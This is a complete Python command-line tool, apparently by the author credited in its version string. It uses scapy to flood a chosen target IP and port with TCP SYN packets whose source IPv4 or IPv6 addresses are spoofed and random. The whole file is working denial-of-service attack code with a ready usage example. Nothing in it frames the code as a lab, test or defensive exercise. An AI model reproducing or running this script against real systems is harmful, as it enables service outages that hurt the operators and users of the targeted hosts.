from sys import stdout
from scapy.all import *
from random import randint
from argparse import ArgumentParser

def generate_random_ipv4():
    """Generate a random IPv4 address."""
    return ".".join(str(randint(0, 255)) for _ in range(4))

def generate_random_port():
    """Generate a random port number between 1000 and 9000."""
    return randint(1000, 9000)

def syn_flood_v4(dst_ip, dst_port, count):
    """Perform a SYN Flood attack using IPv4."""
    total_packets_sent = 0
    print("IPv4 Packets are sending ...")

    for _ in range(count):
        s_port = generate_random_port()
        s_eq = generate_random_port()
        w_indow = generate_random_port()

        ip_packet = IP(src=generate_random_ipv4(), dst=dst_ip)
        tcp_packet = TCP(sport=s_port, dport=int(dst_port), flags="S",
                         seq=s_eq, window=w_indow)

        send(ip_packet / tcp_packet, verbose=0)
        total_packets_sent += 1

    stdout.write("\nTotal packets sent: %i\n" % total_packets_sent)

def syn_flood_v6(dst_ip, dst_port, count):
    """Perform a SYN Flood attack using IPv6."""
    total_packets_sent = 0
    print("IPv6 Packets are sending ...")

    for _ in range(count):
        s_port = generate_random_port()
        s_eq = generate_random_port()
        w_indow = generate_random_port()

        ip_packet = IPv6(src=RandIP6(), dst=dst_ip)
        tcp_packet = TCP(sport=s_port, dport=int(dst_port), flags="S",
                         seq=s_eq, window=w_indow)

        send(ip_packet / tcp_packet, verbose=0)
        total_packets_sent += 1

    stdout.write("\nTotal packets sent: %i\n" % total_packets_sent)

def main():
    parser = ArgumentParser(
        description="Python SynFlood Tool - Generate SYN Flood attack packets."
    )
    parser.add_argument('--target', '-t', help='Target IP address', required=True)
    parser.add_argument('--port', '-p', help='Target port number', required=True)
    parser.add_argument('--count', '-c', help='Number of packets to send', default=1, type=int)
    parser.add_argument('--format', '-f', help='IP version format (4 for IPv4, 6 for IPv6)', choices=['4', '6'], default='4')
    parser.add_argument('--version', '-v', action='version', version='Python SynFlood Tool v2.0.1\n@EmreOvunc')
    parser.epilog = "Usage: python3 py3_synflood_cmd.py -t 10.20.30.40 -p 8080 -c 1 -f 6"

    args = parser.parse_args()

    if args.format == '6':
        syn_flood_v6(args.target, args.port, args.count)
    else:
        syn_flood_v4(args.target, args.port, args.count)

if __name__ == "__main__":
    main()
